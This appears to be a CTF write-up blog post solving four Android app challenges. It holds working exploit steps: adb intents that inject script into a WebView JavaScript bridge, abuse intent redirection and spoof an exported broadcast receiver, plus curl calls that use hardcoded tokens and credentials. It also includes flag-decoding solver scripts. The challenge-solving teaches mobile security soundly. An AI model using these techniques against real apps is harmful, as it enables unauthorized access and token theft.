---
layout: post
title: "Nahamcon Winter CTF - Mobile"
date: 2025-12-18
image: /assets/.
categories: ["Nahamcon"]
tags: [mobile, java, ctf2025]
excerpt: " "
---

## Bug Bounty Hub

### Intro

On paper, **BugBountyHub** is a “tidy” app: it helps bug hunters jot down reports, and it has a **preview** feature so your report looks professional because it can render HTML.

But there’s a classic problem that often becomes the root cause on mobile: *“HTML preview” + `WebView` + `JavaScript enabled` + “allowed to load external URLs”*.

In this write-up I’ll walk through the flow from recon to exploit, and then (bonus) I’ll also extract the “admin token” pulled from a native library—so you get the full picture, not just “shoot payload, get flag”.

---

### Recon: “what does this APK do, and where’s the entry point?”

Start with the most boring but most important thing: the package identity.

```bash
$ aapt dump badging bugbountyhub.apk | head
package: name='com.example.bugbountyhub' versionCode='1' versionName='1.0' ...
sdkVersion:'24'
targetSdkVersion:'36'
uses-permission: name='android.permission.INTERNET'
```

Then I decoded the APK so I could read `AndroidManifest.xml` and smali comfortably:

```bash
$ apktool d -f -o apktool_out bugbountyhub.apk
```

The manifest immediately gives a big clue:

- `android:debuggable="true"` and `android:testOnly="true"` (it’s a challenge, but it also means the developer isn’t very “defensive”).
- Most importantly: `MainActivity` is **exported**.

```xml
<activity
  android:name="com.example.bugbountyhub.MainActivity"
  android:exported="true">
  ...
</activity>
```

`android:exported="true"` means: *other apps / adb / anyone can call this activity via an intent*.

---

### Following the “HTML preview” trail: from intent → WebView

Because the description mentions “preview feature supports HTML rendering”, the natural target is `WebView`.

I looked for the usual suspects: `WebView`, `loadUrl`, `addJavascriptInterface`, or intent extras that look like URLs.

```bash
$ rg -n "report_url|loadUrl|addJavascriptInterface|WebView" apktool_out/smali* | head
```

Found it in `MainActivity.smali`. The most telling parts are:

1) **JavaScript is enabled**:

```smali
invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
```

2) There’s a **JavascriptInterface** named `"Android"`:

```smali
new-instance v3, Lcom/example/bugbountyhub/AppBridge;
...
const-string v4, "Android"
invoke-virtual {v0, v3, v4}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
```

3) And this is the exploit “highway”: the activity reads the intent extra `report_url` and directly calls `loadUrl()`:

```smali
const-string v3, "report_url"
invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
...
invoke-virtual {v1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
```

Meaning: **I can open any URL inside the app’s WebView**, and that URL will run with:

- JavaScript enabled
- An `Android` bridge (native power via `@JavascriptInterface`)

If this were a real app, this would already be a *critical design flaw*.

---

### The core bug: WebView becomes a “browser” that holds the house keys

`addJavascriptInterface()` isn’t just a “feature”; it literally exposes Java/Kotlin functions to be callable from JavaScript.

In `AppBridge.smali`, the app exposes `getToken()` to JS:

```smali
.method public final getToken()Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation
    sget-object v0, Lcom/example/bugbountyhub/NativeLib;->INSTANCE:Lcom/example/bugbountyhub/NativeLib;
    invoke-virtual {v0}, Lcom/example/bugbountyhub/NativeLib;->getAdminToken()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method
```

So from JavaScript, we can simply do:

```js
Android.getToken()
```

Only one question remains: **how do we inject JS that will execute in that WebView?**

Answer: that `report_url`. Because it calls `loadUrl()` on raw input from the intent, we can provide a `data:` URL (inline HTML) containing `<script>...</script>`.

---

### Exploit: call `MainActivity` via adb, inject a `data:` URL, read the token

Install note from the challenge: use `adb -t install`:

```bash
$ adb -t install bugbountyhub.apk
```

Then trigger `MainActivity` and inject HTML+JS via a `data:` URL:

```bash
$ adb shell am start \
  -n com.example.bugbountyhub/.MainActivity \
  --es report_url "data:text/html,%3Cscript%3Edocument.body.innerText%3DAndroid.getToken()%3C%2Fscript%3E"
```

That payload is the URL-encoded version of:

```html
<script>document.body.innerText=Android.getToken()</script>
```

Result: the WebView will display the admin token—which in this challenge is the flag:

```
flag{Br1dg3_t0_N4t1v3_W0r!d}
```

Why does this work?

- Activity exported ⇒ can be invoked from outside
- `report_url` is untrusted ⇒ can be pointed to attacker content
- JavaScript enabled + JS bridge ⇒ attacker can call `Android.getToken()`

---

## Bonus RE: where does that token/flag come from? (nativecore)

Because `getToken()` calls a native method, I checked the native library:

```bash
$ find apktool_out/lib -type f
apktool_out/lib/x86_64/libnativecore.so
```

The dynamic symbols are still friendly enough for hunting:

```bash
$ nm -D --defined-only apktool_out/lib/x86_64/libnativecore.so | rg 'decodeToken|getAdminToken'
00000000000268c0 T Java_com_example_bugbountyhub_NativeLib_getAdminToken
00000000000264a0 T _Z11decodeTokenv
```

Important addresses:

- `decodeToken()` in `.text`: **0x000264a0**
- `Java_com_example_bugbountyhub_NativeLib_getAdminToken`: **0x000268c0**

In `decodeToken()`, there’s a byte blob in `.rodata` that gets processed. This blob shows up in the file as the first 28 bytes of `.rodata` (offset **0x14e40**):

```bash
$ xxd -g 1 -l 0x1c -s 0x14e40 apktool_out/lib/x86_64/libnativecore.so
00014e40: 3a cd 35 a6 39 bc 9c 91 10 3e 39 57 5c 50 35 d6
00014e50: 20 89 48 27 cf 00 26 86 66 5d 82 36
```

If we “translate” the assembly loop (starting at `decodeToken()` @ `0x264a0`), the behavior is roughly:

### Pseudocode from the ASM conversion

```c
// decodeToken() @ 0x264a0
// enc bytes in .rodata (len=0x1c), then reversed and transformed byte-by-byte
string decodeToken() {
    uint8_t enc[0x1c] = { 0x3a, 0xcd, 0x35, ... , 0x82, 0x36 };
    reverse(enc);

    for (int i = 0; i < 0x1c; i++) {
        uint8_t b = enc[i];

        // parity-based XOR (see the branch around 0x26582)
        b ^= (i % 2 == 0) ? 0x7e : 0x3f;

        // b = b - (i*5) (pattern LEA rcx,[i + i*4])
        b = (uint8_t)(b - (i * 5));

        // rotate-right with shift = (i%3)+1 (the magic multiply 0xAAAAAAAAAAAAAAAB part)
        int s = (i % 3) + 1;
        b = ror8(b, s);

        // final xor
        b ^= 0x42;

        out[i] = (char)b;
    }

    return string(out, 0x1c);
}
```

I reimplemented the pseudocode above in Python (to “prove” the result):

```bash
$ python3 - <<'PY'
enc = bytes.fromhex(
  "3acd35a639bc9c91103e39575c5035d6"
  "20894827cf002686665d8236"
)
enc = enc[::-1]

def ror8(x, s):
  return ((x >> s) | ((x << (8 - s)) & 0xff)) & 0xff

out = bytearray()
for i, b in enumerate(enc):
  b ^= 0x7e if (i % 2 == 0) else 0x3f
  b = (b - (i * 5)) & 0xff
  b = ror8(b, (i % 3) + 1)
  b ^= 0x42
  out.append(b)

print(out.decode())
PY
flag{Br1dg3_t0_N4t1v3_W0r!d}
```

So the admin token isn’t “plain hardcoded” in Java/Kotlin—it’s hidden in native, but it’s still retrievable *without any permissions*, just via `Android.getToken()`.


### Flag

`flag{Br1dg3_t0_N4t1v3_W0r!d}`

---

## Dojo Helper Center

### Intro

The **Dojo YesWeHack Helpcenter** app looks calm: just help center category pages that, when clicked… at best show a `Toast`. But in CTFs, “apps that look empty” are usually just a mask.

Our goal is simple: find what the dev “forgot”, then use it to hit internal endpoints on the challenge server:

- Scope: `5g00e23ual31.ctfhub.io`
- Artifact: `dojo-helpcenter.apk`

In this write-up I’ll take you from recon → decompile → token discovery → *immediately* grabbing the flag. No long drama, but still feels like “following the trail”.

---

### Recon: start from the APK and visible traces

First, make sure it’s a real APK:

```bash
$ file dojo-helpcenter.apk
dojo-helpcenter.apk: Android package (APK) ...
```

I usually “crack it open from two sides” right away:

- `apktool` for resources + manifest + smali (great for low-level behavior)
- `jadx` for Java decompile (great for logic)

```bash
$ apktool d -f dojo-helpcenter.apk -o apktool_out
$ jadx -d jadx_out dojo-helpcenter.apk
```

Peeking at `AndroidManifest.xml` also gives “debug build” vibes:

```xml
<application
  android:allowBackup="true"
  android:debuggable="true"
  android:testOnly="true"
  android:usesCleartextTraffic="true">
```

Classic red flags—but the flag isn’t from backup. So we keep going and look for something usable to talk to the backend.

---

### Reverse Engineering: find the “artery” (endpoint & credential)

The fastest mobile RE trick: **search for strings that smell like networking + auth**.

```bash
$ rg -n "http|https|Authorization|Bearer|token|api" -S jadx_out/sources
```

It quickly narrows down to the app package:

```bash
$ find jadx_out/sources/com/example/helpcenter_yeswehack -maxdepth 1 -type f
.../ApiClient.java
.../Constants.java
.../MainActivity.java
.../ArticleListActivity.java
```

`MainActivity` only does `Toast`. The interesting part is `Constants.java`:

```java
// jadx_out/sources/com/example/helpcenter_yeswehack/Constants.java
public class Constants {
    public static final String API_TOKEN = "ZedrlHPRBlgpmEVwB601owCiMEcIaYtn";
    public static final String BASE_URL = "https://fakeapi.dojo-yeswehack.com/";
    ...
}
```

At this point I briefly got baited by the “obvious” direction: if there’s a `BASE_URL`, try hitting it.

```bash
$ curl -sS -D- https://fakeapi.dojo-yeswehack.com/help_center/collections | head
HTTP/1.0 403 Forbidden
...
```

403 + a “fakeapi” domain = pretty clearly a decoy. So I went back to the real scope (`5g00e23ual31.ctfhub.io`) and looked for the actual endpoint documentation.

If you look at `ApiClient.java`, this token is used for the `Authorization: Bearer ...` header:

```java
// jadx_out/sources/com/example/helpcenter_yeswehack/ApiClient.java
conn.setRequestProperty("Authorization", "Bearer " + getAuthToken());
```

To keep this “proper RE mode”, I also checked the smali via apktool (the “address” inside the APK):

- `classes3.dex` → `apktool_out/smali_classes3/com/example/helpcenter_yeswehack/ApiClient.smali`

Smali snippet of `getAuthToken()`:

```smali
.method private static getAuthToken()Ljava/lang/String;
    .locals 3

    const-string v0, "ZedrlHPRBlgpmEVwB601owCiMEcIaYtn"
    const/4 v1, 0x0
    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v0

    new-instance v1, Ljava/lang/String;
    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    const-string v2, "token:"
    invoke-virtual {v1, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    ...
.end method
```

#### Pseudocode (converted from smali)

```text
function getAuthToken():
    decodedBytes = Base64.decode(Constants.API_TOKEN)
    tokenString  = String(decodedBytes)
    if tokenString startsWith "token:":
        return tokenString.substring(6)
    return tokenString
```

In short: **there’s a hardcoded credential**. Now we just need to find where the real backend is that uses this token.

---

### Recon on the server: Swagger, endpoints, and the “admin door”

Enter the challenge scope:

```bash
$ curl -sS https://5g00e23ual31.ctfhub.io/ | head
... Swagger UI ...
```

Fetch the swagger spec:

```bash
$ curl -sS https://5g00e23ual31.ctfhub.io/api/swagger.json | head
```

In there, there’s an interesting admin endpoint:

- `GET /api/admin/internal` (requires a Bearer token)

Swagger even *spoils* the token source: “Admin token found in mobile app”.

So we don’t need to guess weird parameters. We just bring the hardcoded token to the admin endpoint.

---

### Exploit: use the hardcoded token → grab the flag

The admin endpoint is on `https`, so just send it with the `Authorization` header.

```bash
$ curl -sS -L \
  -H 'Authorization: Bearer ZedrlHPRBlgpmEVwB601owCiMEcIaYtn' \
  https://5g00e23ual31.ctfhub.io/api/admin/internal
```

The output is JSON, and the flag is in the `flag` field:

```json
{"flag":"flag{3xp0s3d_Cr3ds_G03ssss_BrrRrr}", ...}
```

### Flag

`flag{3xp0s3d_Cr3ds_G03ssss_BrrRrr}`

---

## Ebank

### Intro

Ebank looks like a polished, confident “bank app”. The dev team even seems very relaxed: *“our security measures are solid.”*  
But rumors say there’s a user who can open a hidden feature… without actually having the intended access.

And yes—this is one of those classic mobile bugs that still happens a lot: **intent redirection / intent injection**. You don’t need to be “premium”, you just need to be “good at sending intents”.

In this write-up I’ll tell the flow from scratch: recon the APK, break down its activities, find the backdoor, then assemble the flag—part of which is hidden in a native library.

---

### Recon: “what’s inside the APK?”

Start with a quick file inspection:

```bash
$ ls -la
Ebank.apk

$ file Ebank.apk
Ebank.apk: Zip archive data, at least v0.0 to extract, compression method=store
```

Because it’s Android, the usual tools: `apktool` for resources/manifest, and `jadx` for pseudo-source.

```bash
$ apktool d -f -o out_apktool Ebank.apk

$ jadx -d out_jadx "$(realpath Ebank.apk)"
```

After decompiling, the first thing I check is the **AndroidManifest**—the list of entry points.

```bash
$ sed -n '1,120p' out_apktool/AndroidManifest.xml
```

What stands out:

- `LoginActivity` is **exported=true** (meaning it can be invoked from outside the app).
- `HomeActivity` and `PremiumActivity` are **exported=false** (supposedly “internal only”).

Here’s the important snippet (see `out_jadx/resources/AndroidManifest.xml:30`):

```xml
<activity android:name="com.sehno.ebank.LoginActivity" android:exported="true" />
<activity android:name="com.sehno.ebank.PremiumActivity" android:exported="false" />
```

If there’s a “hidden premium” feature, the typical path is: login → internal navigation → premium.
The question is: *can we steer that “navigation”?*

---

### Finding the “steering wheel”: LoginActivity trusts `redirect`

Look at `LoginActivity`:

```bash
$ nl -ba out_jadx/sources/com/sehno/ebank/LoginActivity.java | sed -n '120,180p'
```

The root cause:

```java
private final void redirectToNextActivity() {
    Intent intent;
    String redirectClass = getIntent().getStringExtra("redirect");
    if (redirectClass != null) {
        try {
            intent = new Intent(this, Class.forName(redirectClass));
        } catch (ClassNotFoundException e) {
            intent = new Intent(this, (Class<?>) HomeActivity.class);
        }
    } else {
        intent = new Intent(this, (Class<?>) HomeActivity.class);
    }
    startActivity(intent);
    finish();
}
```

Simple but fatal:

> After a successful login, the app will open whatever activity class name we put in the `redirect` extra (via `Class.forName()`).

`PremiumActivity` is indeed `exported=false`, but that only prevents **external apps** from invoking it directly.  
If the caller is **the app itself** (because we “steer” `LoginActivity`), Android will allow it.

So the exploit plan is clear:

1. Start `LoginActivity` from outside (allowed, exported).
2. Send extra `redirect=com.sehno.ebank.PremiumActivity`.
3. Actually log in (so `redirectToNextActivity()` runs).
4. The app itself opens `PremiumActivity`.

---

### “Real login”, but the credentials… are in strings.xml

Before going further, we need valid credentials.  
`LoginActivity` base64-decodes string resources `debug` and `access`.

Find them in `strings.xml`:

```bash
$ rg -n 'name="debug"|name="access"' out_apktool/res/values/strings.xml
```

Contents:

```xml
<string name="debug">YWRtaW4=</string>
<string name="access">UEBzc3cwcmQxMjMh</string>
```

Decode:

```bash
$ python3 - <<'PY'
import base64
print(base64.b64decode("YWRtaW4=").decode())
print(base64.b64decode("UEBzc3cwcmQxMjMh").decode())
PY
admin
P@ssw0rd123!
```

Okay. Username/password found.

---

### Exploit: “send the intent, log in, and… enter premium”

Now we just push the intent from outside. Easiest via `adb`:

```bash
$ adb shell am start \
  -n com.sehno.ebank/.LoginActivity \
  --es redirect com.sehno.ebank.PremiumActivity
```

In the UI, log in with:

- username: `admin`
- password: `P@ssw0rd123!`

Once login succeeds, `redirectToNextActivity()` opens `PremiumActivity` (internal), and the flag is displayed there.

If you look at `PremiumActivity`, it literally does:

```java
flagTextView.setText(generateFlag());
```

And `generateFlag()` assembles the flag from 5 parts.

---

### Reversing the flag: 4 Java parts, 1 native part

See `PremiumActivity`:

```bash
$ nl -ba out_jadx/sources/com/sehno/ebank/PremiumActivity.java | sed -n '50,160p'
```

The idea:

```java
return part1 + part2 + part3 + part4 + part5;
```

#### Part 1 (reversed hex)

`R.string.error_code_404` contains `b77616c666` (see `out_jadx/resources/res/values/strings.xml:63`).
In Java, that string is reversed then parsed per 2 hex chars:

Result: `flag{`

#### Part 2 (XOR with a key derived from the package name)

The key is computed from the sum of ASCII of all characters in `getPackageName()`, then mod 256.
For package `com.sehno.ebank`, it becomes `0xB9` (185).
XOR the byte array `[-16, -41, -51, -118, -41, -51]` → `Int3nt`

#### Part 3 (regular base64)

`R.string.api_timeout_value = X1JlZCFy` → base64 decode → `_Red!r`

#### Part 5 (bitwise NOT)

`[-79, -102, -101, -126]` → `~b & 0xff` per byte → `Ned}`

Up to here, we have:

```
flag{ + Int3nt + _Red!r + (part4) + Ned}
```

The only missing piece is part4—and it comes from the native library `libebank.so`.

---

### Native part (Part 4): function addresses + ASM pseudocode

The library is located at:

```bash
$ file out_apktool/lib/arm64-v8a/libebank.so
ELF 64-bit LSB shared object, ARM aarch64, ... stripped
```

Even if it’s stripped, JNI symbols are usually still visible. Use `readelf`:

```bash
$ readelf -Ws out_apktool/lib/arm64-v8a/libebank.so | rg 'Java_'
```

The important ones:

- `Java_com_sehno_ebank_NativeLib_getFlagPart` @ **0x000000000001ddc4**
- `Java_com_sehno_ebank_NativeLib_getDecoyFlag` @ 0x000000000001dec0
- `Java_com_sehno_ebank_NativeLib_getApiKey` @ 0x000000000001def0

Disassemble the flag portion (use `llvm-objdump` to make AArch64 readable):

```bash
$ llvm-objdump -d --arch=aarch64 --no-show-raw-insn \
  --start-address=0x1ddc4 --stop-address=0x1de40 \
  out_apktool/lib/arm64-v8a/libebank.so
```

What you see: this JNI function just calls a helper `deobfuscate()` then `NewStringUTF`.

The helper:

```bash
$ readelf -Ws out_apktool/lib/arm64-v8a/libebank.so | rg 'deobfuscate'
_Z11deobfuscatev  @ 0x000000000001dc40

$ llvm-objdump -d --arch=aarch64 --no-show-raw-insn \
  --start-address=0x1dc40 --stop-address=0x1dd18 \
  out_apktool/lib/arm64-v8a/libebank.so
```

Inside the loop there’s a clear pattern:

- load a byte from `.rodata`
- `eor` with constant **0x7a**
- append to the output string
- stop when it hits `0x00` (null terminator)

The `.rodata` start address from the section header:

```bash
$ readelf -S out_apktool/lib/arm64-v8a/libebank.so | rg '\\.rodata'
[11] .rodata PROGBITS Address 0000000000013400 ...
```

And the obfuscated bytes start at **0x0000000000013400**.

#### Pseudocode

Here’s pseudocode that matches what the native code does (simplified for readability):

```c
// .rodata @ 0x13400
// obf = 1f 19 0e 33 4a 14 25 0a 2d 00

string deobfuscate() {
  string out = "";
  for (int i = 0; ; i++) {
    uint8_t b = rodata_0x13400[i];
    if (b == 0) break;
    out += (char)(b ^ 0x7a);
  }
  return out;
}

jstring Java_com_sehno_ebank_NativeLib_getFlagPart(JNIEnv* env, jobject thiz) {
  string s = deobfuscate();
  return env->NewStringUTF(s.c_str());
}
```

If executed, part4 = `ectI0n_pW`.

---

### Assemble everything

If you want to assemble the flag without an emulator, you can do it purely by reversing.
This Python snippet “replays” `PremiumActivity` + the native decode:

```py
import base64

# part1: decodeHexReversed("b77616c666") -> "flag{"
hex_string = "b77616c666"
rev = hex_string[::-1]
part1 = bytes(int(rev[i:i+2], 16) for i in range(0, len(rev), 2)).decode()

# part2: xorDecode([-16,-41,-51,-118,-41,-51], deriveKey("com.sehno.ebank"))
pkg = "com.sehno.ebank"
key = sum(map(ord, pkg)) % 256
obf2 = bytes((x + 256) % 256 for x in [-16, -41, -51, -118, -41, -51])
part2 = bytes(b ^ key for b in obf2).decode()

# part3: base64("X1JlZCFy") -> "_Red!r"
part3 = base64.b64decode("X1JlZCFy").decode()

# part4: native .rodata bytes xor 0x7a -> "ectI0n_pW"
obf4 = bytes([0x1f, 0x19, 0x0e, 0x33, 0x4a, 0x14, 0x25, 0x0a, 0x2d])
part4 = bytes(b ^ 0x7a for b in obf4).decode()

# part5: deobfuscateBitwise([-79,-102,-101,-126]) -> "Ned}"
obf5 = bytes((x + 256) % 256 for x in [-79, -102, -101, -126])
part5 = bytes((~b) & 0xff for b in obf5).decode("latin1")

print(part1 + part2 + part3 + part4 + part5)
```

Output:

```
flag{Int3nt_Red!rectI0n_pWNed}
```

### Flag

`flag{Int3nt_Red!rectI0n_pWNed}`

---

## Magic Snowfall

### Intro

There’s a type of mobile challenge that looks “cute”: a rewards app, a refresh button, snow points, VIP tiers… and at the end there’s an exclusive “prize”. But once we get the APK, there are usually two paths:

1) the logic is only in the UI / SharedPreferences (just set values),
2) or something is “neatly hidden” in a native library.

**Magic Snowfall** turns out to be both: there’s an **unlock tier via broadcast** path, and then the flag is stored in **JNI native (`libsnowflag.so`)** with “Medium-level” obfuscation—enough to force us to spend a bit of time in ASM.

In this write-up I’ll go from recon to exploit: start from the manifest, find an exported BroadcastReceiver, then break down how `getFlag()` builds the flag from `.rodata` constants.

---

### Recon: what does this APK do?

Start from the provided file:

```bash
$ ls -la
MagicSnowfall.apk
```

Check the manifest first (fastest via `apktool`):

```bash
$ apktool d -f MagicSnowfall.apk -o out_apktool >/dev/null
$ sed -n '1,120p' out_apktool/AndroidManifest.xml
```

What immediately stands out:

- `android:debuggable="true"` (developers being “kind”)
- `MainActivity` is the launcher
- there’s an exported `receiver`:

```xml
<receiver
  android:name="com.sehno.magicsnowfall.SnowRewardReceiver"
  android:exported="true">
  <intent-filter>
    <action android:name="com.krypton.winterbank.ACTION_SNOWFALL_REWARD" />
  </intent-filter>
</receiver>
```

Exported receiver + a “bank-ish” action string = smells like **intent injection**.

Then decompile so it’s easy to read Kotlin/Java:

```bash
$ jadx -d out_jadx MagicSnowfall.apk
```

Initial target: the app’s own classes under `com.sehno.magicsnowfall`.

---

### Where it gets fun: a BroadcastReceiver exposed to the public

Open `SnowRewardReceiver`:

```bash
$ sed -n '1,220p' out_jadx/sources/com/sehno/magicsnowfall/SnowRewardReceiver.java
```

There are three important extras:

- `bonus_points`
- `bonus_tier`
- `secret_key`

Logic snippet:

```java
if (secretKey != null && !secretKey.equals("winter2025")) {
  Toast.makeText(context, "Invalid secret key", 0).show();
  return;
}

int bonusPoints = intent.getIntExtra("bonus_points", 0);
if (bonusPoints > 0) rewardManager.addPoints(bonusPoints);

String bonusTier = intent.getStringExtra("bonus_tier");
if (bonusTier != null && bonusTier.length() > 0) rewardManager.setTier(bonusTier);
```

The funniest part: **the secret key is optional**.

- If we send `secret_key` but it’s wrong → rejected.
- If we **don’t send `secret_key` at all** → accepted.

So this “backdoor” is basically: *broadcast it, freely set the tier*.

---

### Climb to Aurora VIP: the easiest exploit

Because the receiver is exported, we can trigger it from outside the app using `adb`:

```bash
$ adb shell am broadcast \
  -a com.krypton.winterbank.ACTION_SNOWFALL_REWARD \
  --es bonus_tier aurora_vip
```

Optional:

```bash
$ adb shell am broadcast \
  -a com.krypton.winterbank.ACTION_SNOWFALL_REWARD \
  --es bonus_tier aurora_vip \
  --ei bonus_points 1337
```

After that, open the app / press refresh: the tier becomes Aurora VIP and the UI starts trying to show the “prize”.

But… the prize isn’t a normal string.

---

### Plot twist: the flag is fetched via JNI native

`MainActivity` logic:

- reads `points` and `tier` from `SharedPreferences` via `SnowRewardManager`
- if the tier is premium (`aurora_vip`) → calls `FlagProvider.getFlag(tier)`

See this section:

```bash
$ sed -n '1,240p' out_jadx/sources/com/sehno/magicsnowfall/MainActivity.java
```

And the `FlagProvider`:

```bash
$ sed -n '1,120p' out_jadx/sources/com/sehno/magicsnowfall/FlagProvider.java
```

It’s short, but it makes us work:

```java
public final native String getFlag(String tier);

static {
  System.loadLibrary("snowflag");
}
```

Meaning the flag lives in `libsnowflag.so`.

---

### Dissecting `libsnowflag.so`: find the entrypoint and key addresses

In the APK decoded with `apktool`, the library exists for multiple ABIs:

```bash
$ find out_apktool/lib -name 'libsnowflag.so'
out_apktool/lib/arm64-v8a/libsnowflag.so
out_apktool/lib/armeabi-v7a/libsnowflag.so
out_apktool/lib/x86_64/libsnowflag.so
out_apktool/lib/x86/libsnowflag.so
```

I chose `x86_64` because it’s easier to read with `objdump/nm`.

Find JNI symbols:

```bash
$ nm -D --defined-only out_apktool/lib/x86_64/libsnowflag.so
00000000000138a8 T Java_com_sehno_magicsnowfall_FlagProvider_getFlag
0000000000013b7d T Java_com_sehno_magicsnowfall_FlagProvider_validateCoupon
```

Addresses we’ll use:

- `getFlag` at `0x138a8`
- `validateCoupon` at `0x13b7d`

Now the core question: what does `getFlag` do to “produce” the flag?

---

### From ASM to a readable story: the key is in `.rodata`

If we disassemble a bit, there’s a part that “points” to static data via RIP-relative `lea`.

An important example (around an internal helper at `0x1434d`):

```bash
$ objdump -d -Mintel --start-address=0x1434d --stop-address=0x143a5 out_apktool/lib/x86_64/libsnowflag.so
```

We get this pattern:

```asm
0x0000000000014366: lea rsi, [rip+0x... ]  # 0x683c
0x000000000001436d: lea rcx, [rip+0x... ]  # 0x67d0
...
```

And in another function (around `0x14238`) we see:

```asm
0x0000000000014238: lea rsi, [rip+0x... ]  # 0x6810
```

So there are 3 `.rodata` addresses that are the “treasure”:

- `0x6810` → salt string
- `0x67d0` → 32-byte key (looks super random)
- `0x683c` → 30-byte blob (candidate ciphertext)

Dump `.rodata` in that range:

```bash
$ objdump -s -j .rodata --start-address=0x67d0 --stop-address=0x6890 out_apktool/lib/x86_64/libsnowflag.so
```

We see a neat structure:

- `0x67d0`: `1a 2d f6 d9 4e 80 ... 5e eb 53 d4` (32 bytes)
- `0x6810`: `frozen_gift_shop_winter_2025_secret_salt_key` (44-byte string)
- `0x683c`: `09 d2 16 66 39 af ... d3 38` (30 bytes)

If this isn’t a “flag key schedule”, I don’t know what is.

---

### Pseudocode (core of `getFlag`)

The full ASM is long (lots of runtime glue), but the core can be summarized like this:

```c
// address map (x86_64):
// key32 @ 0x67d0 (32 bytes)
// salt  @ 0x6810 (44 bytes string)
// enc30 @ 0x683c (30 bytes)
// getFlag() @ 0x138a8

string getFlag(string tier) {
    // derive dynamic key from user-controlled tier
    bytes k = sha256(tier + "frozen_gift_shop_winter_2025_secret_salt_key");

    // two-key XOR obfuscation
    // flag[i] = enc30[i] ^ key32[i] ^ k[i]
    bytes flag[30];
    for (i = 0; i < 30; i++) {
        flag[i] = enc30[i] ^ key32[i] ^ k[i];
    }

    return bytes_to_string(flag);
}
```

At this point, we don’t even need an emulator: just extract those 3 constants from the `.so`, compute SHA-256, then XOR.

---

### Solver: extract the flag directly from `libsnowflag.so`

This is the Python script I used (also as “proof” that the algorithm is correct):

```py
import hashlib

path = "out_apktool/lib/x86_64/libsnowflag.so"
with open(path, "rb") as f:
    data = f.read()

key32 = data[0x67d0:0x67d0 + 32]
salt  = data[0x6810:0x6810 + 0x2c]      # 44 bytes
enc30 = data[0x683c:0x683c + 30]

tier = b"aurora_vip"
k = hashlib.sha256(tier + salt).digest()[:30]

flag = bytes(enc30[i] ^ key32[i] ^ k[i] for i in range(30))
print(flag.decode())
```

Output:

```
flag{Sn0wf4ll_br0adCa$t_BonUs}
```

This also lines up with the app’s path:

- `SnowRewardReceiver` lets us set `tier = aurora_vip`
- `MainActivity` only calls `getFlag(tier)` when the tier is premium
- native `getFlag()` uses `tier` as input to derive the SHA-256 key

Neat—and just annoying enough for a “Medium” challenge.

### Flag

`flag{Sn0wf4ll_br0adCa$t_BonUs}`

---
